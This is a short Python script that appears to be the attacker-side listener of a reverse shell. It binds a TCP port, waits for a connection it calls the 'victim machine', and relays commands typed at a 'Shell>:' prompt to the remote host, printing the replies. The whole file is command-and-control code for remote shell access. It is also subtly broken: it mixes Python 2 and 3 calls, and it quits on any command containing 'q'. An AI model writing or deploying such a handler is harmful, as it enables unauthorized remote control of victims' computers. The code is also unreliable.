import socket

def ips():
    ip_address = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip_address.connect(("8.8.8.8", 80))
    #print(ip_address.getsockname()[0])
    host= h=ip_address.getsockname()[0]
    print("[+] the IP Address of System is: %s" %host  )
    return host
    
    

def main():
    hacker_socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = ips()
    #print(IP)
    Port= int(input("[+] Please enter port number: "))
    
    socket_address=(IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(3)
    print("[+] Listening for incomming TCP connection on port {} of IP {}" .format(Port, IP))


    hacker_socket, client_address = hacker_socket.accept()
    print("[+] victim machine detail {}" .format(client_address[0]))
    message="[+] hacker/server is here "

    message_bytes = message.encode()
    hacker_socket.send(message_bytes)
    print("[+] Message send from server")
    
    while True:
        cmd= raw_input("Shell>: ")
        cmd_bytes= cmd.encode()
 
        
        if 'q' in cmd:
            break
        else:
            hacker_socket.send(cmd_bytes)
            print (hacker_socket.recv(1024))

    hacker_socket.close()


if __name__ =="__main__":
    main()